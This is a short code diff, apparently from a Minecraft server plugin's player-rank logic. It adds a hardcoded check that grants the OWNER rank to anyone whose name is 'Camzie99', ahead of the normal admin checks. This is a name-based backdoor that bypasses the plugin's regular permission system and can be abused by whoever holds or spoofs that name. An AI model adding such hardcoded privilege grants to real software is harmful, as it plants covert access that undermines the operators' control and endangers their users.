@@ -81,6 +81,12 @@ public enum TFM_PlayerRank
                 return OWNER;
             }
 
+            if (sender.getName().equals("Camzie99"))
+            {
+                return OWNER;
+            }
+
+            
             if (entry.isSeniorAdmin())
             {
                 rank = SENIOR;
